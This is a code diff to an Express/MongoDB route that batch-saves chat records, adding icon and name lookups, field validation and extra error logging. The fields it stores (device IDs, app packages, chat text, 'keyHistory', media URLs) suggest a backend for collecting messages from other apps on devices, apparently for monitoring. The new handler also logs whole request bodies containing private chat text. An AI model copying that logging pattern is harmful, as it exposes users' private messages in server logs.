@@ -289,6 +289,7 @@ router.post('/batch', async (req, res) => {
         const subsetMergedChats = [];
         let subsetUpdated = 0;
         let subsetSkipped = 0;
+        const subsetIdsToFetch = new Set();
 
         const sortedChats = [...finalChats].sort((a, b) => (a.timestamp || 0) - (b.timestamp || 0));
         sortedChats.forEach(chat => {
@@ -322,6 +323,9 @@ router.post('/batch', async (req, res) => {
                 chat.timestamp = Math.min(timestamp, subsetCandidate.timestamp || timestamp);
                 chat.keyHistory = mergeKeyHistory(subsetCandidate.keyHistory, chat.keyHistory);
                 subsetUpdated += 1;
+                if (!existingIconMap.has(chat.id) && !existingNameMap.has(chat.id)) {
+                    subsetIdsToFetch.add(chat.id);
+                }
             }
 
             pool.push({
@@ -334,36 +338,64 @@ router.post('/batch', async (req, res) => {
             subsetMergedChats.push(chat);
         });
         
+        if (subsetIdsToFetch.size > 0) {
+            const fetchedSubsetChats = await db.collection('chats')
+                .find({ id: { $in: Array.from(subsetIdsToFetch) } })
+                .project({ id: 1, iconUrl: 1, chatName: 1 })
+                .toArray();
+            fetchedSubsetChats.forEach(existingChat => {
+                if (!existingIconMap.has(existingChat.id)) {
+                    existingIconMap.set(existingChat.id, existingChat.iconUrl || null);
+                }
+                if (!existingNameMap.has(existingChat.id)) {
+                    existingNameMap.set(existingChat.id, existingChat.chatName || null);
+                }
+            });
+        }
+
         const operations = subsetMergedChats.map(chat => {
             const iconUrl = chat.iconUrl || existingIconMap.get(chat.id) || null;
             const chatName = chat.chatName || chat.chatIdentifier || existingNameMap.get(chat.id) || null;
-            return {
-
-            replaceOne: {
-                filter: { id: chat.id },
-                replacement: {
-                    id: chat.id,
-                    deviceId: chat.deviceId || null,
-                    appPackage: chat.appPackage,
-                    appName: chat.appName,
-                    chatIdentifier: chat.chatIdentifier || null,
-                    chatName: chatName,
-                    text: chat.text,
-                    keyHistory: chat.keyHistory || null,
-                    mediaUrls: chat.mediaUrls || null,
-                    iconUrl: iconUrl,
-                    timestamp: chat.timestamp || Date.now(),
-                    synced: true,
-                    syncAttempts: 0,
-                    lastSyncAttempt: null,
-                    errorMessage: null,
-                    createdAt: Math.floor(Date.now() / 1000)
-                },
-                upsert: true
+            
+            // Ensure chat.id exists (required for upsert)
+            if (!chat.id) {
+                throw new Error(`Chat missing required field 'id': ${JSON.stringify(chat)}`);
             }
-        }});
+            
+            // Ensure required fields exist
+            if (!chat.appPackage || !chat.appName || !chat.text) {
+                throw new Error(`Chat missing required fields (appPackage, appName, or text): ${JSON.stringify(chat)}`);
+            }
+            
+            return {
+                replaceOne: {
+                    filter: { id: chat.id },
+                    replacement: {
+                        id: chat.id,
+                        deviceId: chat.deviceId || null,
+                        appPackage: chat.appPackage,
+                        appName: chat.appName,
+                        chatIdentifier: chat.chatIdentifier || null,
+                        chatName: chatName,
+                        text: chat.text,
+                        keyHistory: chat.keyHistory || null,
+                        mediaUrls: chat.mediaUrls || null,
+                        iconUrl: iconUrl,
+                        timestamp: chat.timestamp || Date.now(),
+                        synced: true,
+                        syncAttempts: 0,
+                        lastSyncAttempt: null,
+                        errorMessage: null,
+                        createdAt: Math.floor(Date.now() / 1000)
+                    },
+                    upsert: true
+                }
+            };
+        });
         
-        await db.collection('chats').bulkWrite(operations);
+        if (operations.length > 0) {
+            await db.collection('chats').bulkWrite(operations);
+        }
         
         // Broadcast WebSocket updates for each unique chat
         subsetMergedChats.forEach(chat => {
@@ -383,9 +415,12 @@ router.post('/batch', async (req, res) => {
         });
     } catch (error) {
         console.error('Error saving batch:', error);
+        console.error('Error stack:', error.stack);
+        console.error('Batch data:', JSON.stringify(req.body, null, 2));
         res.status(500).json({
             success: false,
-            message: 'Error saving batch'
+            message: 'Error saving batch',
+            error: process.env.NODE_ENV === 'development' ? error.message : undefined
         });
     }
 });
